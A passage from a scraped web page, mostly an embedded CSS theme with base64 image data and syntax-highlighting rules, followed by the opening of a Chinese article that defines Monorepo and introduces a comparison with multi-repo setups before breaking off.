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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是 Monorepo？</h2>
<h3 data-id="heading-1">1.1 核心概念</h3>
<p>Monorepo（单体仓库）是一种软件开发架构模式，它将多个相关项目、应用或模块的源代码集中存储在单一的代码仓库中进行管理。与传统的多仓库（Multi-repo）模式不同，Monorepo 允许团队在一个统一的上下文中开发多个相关组件，从而简化了代码共享和项目间依赖管理。</p>
<h3 data-id="heading-2">1.2 与多仓库（Multi-repo）的对比</h3>


















































